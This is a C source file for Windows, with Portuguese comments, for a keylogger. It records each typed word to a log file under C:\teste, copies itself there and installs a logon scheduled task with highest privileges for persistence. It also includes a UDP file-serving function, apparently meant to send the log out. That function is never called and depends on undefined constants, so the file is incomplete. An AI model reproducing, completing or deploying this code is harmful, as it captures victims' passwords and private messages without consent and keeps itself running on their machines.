#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ctype.h>

// TODO daria para colocar essa variavel no arquivo config.cfg, pois conseguiria pegar esse caminho em outros arquivos 
const char *BASE_FOLDER = "C:\\teste";  

bool valPersis();
void transmissorLog();

int main()
{
    FILE *fptr;
    char palavra[100];
    int count = 0;

    if (valPersis())
    {
        while (1)
        {
            for (int vk = 0x08; vk <= 0xFE; vk++)
            {
                if (GetAsyncKeyState(vk) & 0x0001)
                {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
                    WCHAR buffer[5];
                    int result = ToAscii(vk, scanCode, keyboardState, (LPWORD)buffer, 0);

                    if (result > 0)
                    {
                        char c = (char)buffer[0];

                        // Backspace
                        if (vk == VK_BACK)
                        {
                            if (count > 0)
                            {
                                count--;
                                palavra[count] = '\0';
                            }
                            continue;
                        }
                        if (vk == VK_RETURN || vk == VK_SPACE)
                        {
                            if (count > 0)
                            {
                                palavra[count] = '\0';

                                char logPath[MAX_PATH];
                                snprintf(logPath, sizeof(logPath), "%s\\logs.txt", BASE_FOLDER);

                                fptr = fopen(logPath, "a");
                                if (fptr)
                                {
                                    fprintf(fptr, "%s\n", palavra);
                                    fclose(fptr);
                                }
                                count = 0;
                                palavra[0] = '\0';
                            }
                            continue;
                        }

                        // Letras e números
                        if (isprint(c) && count < sizeof(palavra) - 1)
                        {
                            palavra[count++] = c;
                            palavra[count] = '\0';
                        }

                    }
                }
            }
            Sleep(90);
        }
    }

    return 0;
}

void transmissorLog() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    struct sockaddr_in server_addr, client_addr;
    int addr_len = sizeof(client_addr);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));

    char buffer[BUFFER_SIZE];
    printf("Servidor aguardando na porta %d...\n", PORT);

    while (1) {
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE-1, 0,
                         (struct sockaddr*)&client_addr, &addr_len);
        buffer[n] = '\0';

        char *sep = strchr(buffer, ':');
        if (!sep) continue;

        *sep = '\0';
        char *prefix = buffer;
        char *rest = sep + 1;

        if (strcmp(prefix, "quem_esta_ai") == 0 && strcmp(rest, EXPECTED_TOKEN) == 0) {
            // Confirma servidor
            char reply[] = "eu_sou_o_destino";
            sendto(sockfd, reply, strlen(reply), 0,
                   (struct sockaddr*)&client_addr, addr_len);

            printf("Cliente autorizado: %s\n", inet_ntoa(client_addr.sin_addr));

            // Envia o arquivo
            FILE *fp = fopen(FILE_TO_SEND, "rb");
            if (!fp) {
                printf("Erro ao abrir %s\n", FILE_TO_SEND);
                continue;
            }

            while (!feof(fp)) {
                int bytes = fread(buffer, 1, BUFFER_SIZE, fp);
                if (bytes > 0) {
                    sendto(sockfd, buffer, bytes, 0,
                           (struct sockaddr*)&client_addr, addr_len);
                }
            }
            fclose(fp);

            // Envia marcador de fim
            char end_msg[] = "EOF";
            sendto(sockfd, end_msg, strlen(end_msg), 0,
                   (struct sockaddr*)&client_addr, addr_len);

            printf("Arquivo enviado para %s\n", inet_ntoa(client_addr.sin_addr));
        }
    }

    closesocket(sockfd);
    WSACleanup();
}

bool valPersis()
{
    FILE *varsConf;
    char linha[50];
    int valor = 0;

    char configPath[MAX_PATH];
    snprintf(configPath, sizeof(configPath), "%s\\config.cfg", BASE_FOLDER);

    varsConf = fopen(configPath, "r");

    if (!varsConf)
    {
        char currentPath[MAX_PATH];
        char exePath[MAX_PATH];

        GetModuleFileName(NULL, currentPath, MAX_PATH);
        CreateDirectory(BASE_FOLDER, NULL);

        snprintf(exePath, MAX_PATH, "%s\\main.exe", BASE_FOLDER);
        CopyFile(currentPath, exePath, FALSE);

        varsConf = fopen(configPath, "w");
        if (varsConf)
        {
            fprintf(varsConf, "pos=1\n");
            fclose(varsConf);
        }

        char schtasksCmd[MAX_PATH * 2];
        snprintf(schtasksCmd, sizeof(schtasksCmd),
                 "schtasks /create /tn \"MeuProgramaAutoStart\" /tr \"%s\" /sc onlogon /rl highest /f",
                 exePath);

        system(schtasksCmd);

        return false;
    }
    else
    {
        if (fgets(linha, sizeof(linha), varsConf))
        {
            if (sscanf(linha, "pos=%d", &valor) == 1)
            {
                fclose(varsConf);
                return valor == 1;
            }
        }
        fclose(varsConf);
    }

    return false;
}

//gcc main.c -o main.exe -lole32 -luuid -lshell32; ./main.exe